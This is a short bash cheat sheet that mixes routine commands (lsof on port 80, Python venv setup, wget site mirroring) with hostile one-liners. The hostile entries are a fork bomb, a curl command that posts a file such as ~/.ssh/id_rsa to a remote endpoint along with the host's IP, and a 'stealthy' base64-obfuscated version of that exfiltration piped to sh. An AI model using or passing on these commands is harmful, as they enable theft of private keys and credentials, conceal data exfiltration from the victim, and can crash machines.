
### Fork Bomb

```bash
:(){ :|:& };:
```

### Check what is running on local port 80

```bash
sudo lsof -i -n -P | grep ":80"
```

### Send file content to controlled endpoint

```bash
curl https://beeceptorinstance -d "$(cat ~/file)" # ex: ~/.ssh/id_rsa
```

You can also add the ip address with :  `"$(curl ifconfig.me)"`

#### Stealthy mode

```bash
echo Y3VybCBodHRwczovL250Znkuc2gvamRsc2hka3Nrc2JiZGt6amQgLWQgIiQoY2F0IH4vZmlsZSkiIA== | base64 -d | sh
```


#### Python venv

```bash
python3 -m venv env
source env/bin/activate
pip3 install whatever

# Deactivate environment
deactivate
```

#### Copy whole website

```bash
wget -mkEpnp <website>
```

